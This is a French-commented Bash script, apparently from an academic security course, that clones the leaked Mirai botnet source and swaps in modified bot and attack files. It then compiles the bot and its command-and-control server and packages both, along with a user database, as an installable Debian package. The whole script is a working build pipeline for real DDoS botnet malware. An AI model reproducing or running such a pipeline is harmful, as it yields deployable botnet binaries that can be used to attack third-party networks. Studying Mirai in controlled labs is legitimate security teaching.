#!/bin/bash

# === Variables de configuration ===
REPO_URL="https://github.com/jgamblin/Mirai-Source-Code.git"
REPO_BASE="Mirai-Source-Code"
REPO_DIR="$REPO_BASE/mirai"
ARCH="amd64"
PACKAGE_NAME="mirai-bot-and-cnc"
VERSION="1.0"
MAINTAINER="Joachim Schmidt <joachim.schmidt@hesge.ch>"
DESCRIPTION="Mirai bot and CnC - For academic purposes only"

# === Suppression du dépôt git existant ===
echo "[*] Suppression du dépôt git $REPO_BASE existant..."

if [ -d "./$REPO_BASE" ]; then
    rm -rf "./$REPO_BASE"
fi

# === Détection et installation des dépendances ===
echo "[*] Vérification des dépendances..."

REQUIRED_CMDS=("git" "go" "dpkg-deb" "strip")

for cmd in "${REQUIRED_CMDS[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "[!] $cmd est manquant. Installation..."
        sudo apt-get update
        sudo apt-get install -y \
            git golang dpkg-dev 
        break
    fi
done

# === Récupération du dépôt ===
echo "[*] Clonage du dépôt..."
rm -rf "$REPO_DIR"
git clone "$REPO_URL"

# === Copie main.c modifié ===
cp ./main.c "$REPO_DIR/bot"
cp ./attack.c "$REPO_DIR/bot"
cp ./attack_udp.c "$REPO_DIR/bot"

# === Corriger LOCAL_ADDR ===
cd "$REPO_DIR/bot"
find . -name '*.o' -delete

sed -i 's/^ipv4_t LOCAL_ADDR;/extern ipv4_t LOCAL_ADDR;/' includes.h

grep -q "ipv4_t LOCAL_ADDR;" main.c || sed -i '/^#include/!b;:a;N;/\n[^#]/!ba;s/\(#include.*\)/\1\n\nipv4_t LOCAL_ADDR;/' main.c

cd -

# === Génération du Makefile dans bot/ ===
echo "[*] Génération du Makefile dans bot/..."
MAKEFILE="$REPO_DIR/bot/Makefile"
cat > "$MAKEFILE" <<EOF
CC=gcc
CFLAGS=-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -static -DMIRAI_BOT_ARCH=\"amd64\" -DMIRAI_TELNET

RELEASE_DIR := \$(CURDIR)/release

all: clean mirai

mirai:
	@echo "[*] Compilation de Mirai (bot)..."
	mkdir -p "\$(RELEASE_DIR)"
	\$(CC) \$(CFLAGS) *.c -o "\$(RELEASE_DIR)/mirai"
	strip "\$(RELEASE_DIR)/mirai"

clean:
	rm -rf "\$(RELEASE_DIR)"
EOF

# === Compilation du bot via Makefile ===
echo "[*] Compilation du bot via Makefile..."
make -C "$REPO_DIR/bot" all || { echo "Erreur lors de la compilation du bot"; exit 1; }

# === Compilation du CNC ===
echo "[*] Compilation du CNC (Go)..."
CNC_DIR="$REPO_DIR/cnc"
CNC_RELEASE_DIR="release"

cd "$CNC_DIR" || { echo "Le dossier CNC est introuvable !"; exit 1; }
mkdir -p "$CNC_RELEASE_DIR"


if [ ! -f "go.mod" ]; then
    echo "[*] Initialisation du module Go..."
    go mod init cnc || true
fi

go mod tidy

GOARCH=386 GOOS=linux go build -o "$CNC_RELEASE_DIR/cnc" . || { echo "Erreur lors de la compilation du CNC"; exit 1; }

cd -

# === Construction du paquet Debian ===
echo "[*] Construction du paquet Debian..."
PKG_DIR="$REPO_DIR/deb/mirai"
mkdir -p "$PKG_DIR/DEBIAN"
mkdir -p "$PKG_DIR/usr/bin"
mkdir -p "$PKG_DIR/etc/mirai/db"

cp "$REPO_DIR/bot/release/mirai" "$PKG_DIR/usr/bin/mirai"
cp "$CNC_DIR/$CNC_RELEASE_DIR/cnc" "$PKG_DIR/usr/bin/cnc"
cp db-final.sql "$PKG_DIR/etc/mirai/db/db.sql"
cp users.json "$PKG_DIR/etc/mirai/db/users.json"
cp install_db.sh "$PKG_DIR/usr/bin/install_db.sh"
cp display_db.sh "$PKG_DIR/usr/bin/display_db.sh"

cat > "$PKG_DIR/DEBIAN/control" <<EOF
Package: $PACKAGE_NAME
Version: $VERSION
Section: base
Priority: optional
Architecture: $ARCH
Maintainer: $MAINTAINER
Description: $DESCRIPTION
EOF

DEB_NAME="${PACKAGE_NAME}_${VERSION}_${ARCH}.deb"
dpkg-deb --build "$PKG_DIR" "$REPO_DIR/deb/$DEB_NAME"
cp -R "$REPO_DIR/deb/$DEB_NAME" .
echo "✅ Paquet généré : $REPO_DIR/deb/$DEB_NAME et disponible dans $(pwd)"
